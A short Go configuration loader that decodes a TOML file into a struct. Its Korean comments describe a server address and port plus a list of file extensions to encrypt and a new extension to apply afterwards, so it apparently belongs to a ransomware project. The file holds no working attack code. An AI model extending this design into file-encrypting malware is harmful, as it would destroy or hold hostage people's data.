package config

import (
	"github.com/naoina/toml"
	"os"
)

type Config struct {
	// 서버와 통신을 위한 구조체
	Network struct {
		Port string
		Uri  string
	}

	// 암호화를 위한 확장자
	Extensions struct {
		Targets []string // 암호화할 대상파일 확장자.
		NewExt  string   // 암호화 후 바꿀 확장자.
	}
}

func NewConfig(path string) *Config {
	c := new(Config)

	if f, err := os.Open(path); err != nil {
		panic(err)
	} else if err = toml.NewDecoder(f).Decode(c); err != nil {
		panic(err)
	} else {
		return c
	}
}
